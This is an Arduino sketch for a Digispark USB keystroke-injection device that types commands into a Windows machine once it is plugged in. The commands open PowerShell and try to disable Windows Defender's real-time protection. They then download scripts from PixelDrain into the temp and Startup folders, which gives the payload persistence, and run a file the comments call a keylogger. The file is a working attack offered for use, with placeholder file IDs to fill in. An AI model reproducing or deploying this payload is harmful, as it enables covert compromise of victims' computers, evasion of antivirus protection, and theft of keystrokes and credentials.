
#include "DigiKeyboard.h"

void setup() {}

void loop() {
	DigiKeyboard.sendKeyStroke(0);
	// STAGE 1
	// open runbox
	DigiKeyboard.delay(1000);
	DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_R);
	DigiKeyboard.delay(200);
	DigiKeyboard.print("powershell");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(300);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	// STAGE 2
	// attempts to disable defender
	DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true;");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(200);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	// STAGE 3
	// downloading files from PixelDrain
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	// Replace with your actual PixelDrain file URLs
	DigiKeyboard.print("$pixelDrainP = \"https://pixeldrain.com/api/file/YOUR_P_FILE_ID\";");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(100);
	DigiKeyboard.print("$pixelDrainL = \"https://pixeldrain.com/api/file/YOUR_L_FILE_ID\";");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(100);
	DigiKeyboard.print("$pixelDrainC = \"https://pixeldrain.com/api/file/YOUR_C_FILE_ID\";");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(100);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	// Download the files to the temp folder
	DigiKeyboard.print("cd $env:temp; ");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(100);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	// Download p.ps1 from PixelDrain
	DigiKeyboard.print("Invoke-WebRequest \"$pixelDrainP\" -OutFile \"$env:temp\\p.ps1\";");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(300);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	// Download l.ps1 from PixelDrain
	DigiKeyboard.print("Invoke-WebRequest \"$pixelDrainL\" -OutFile \"$env:temp\\l.ps1\";");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(300);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	// Download c.cmd from PixelDrain to Startup directory
	DigiKeyboard.print("Invoke-WebRequest \"$pixelDrainC\" -OutFile \"C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/c.cmd\";");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(300);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	// STAGE 4
	// run keylogger
	DigiKeyboard.print("cd \"C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup\"; .\\c.cmd; exit;");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	// STAGE 5
	// deploy
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
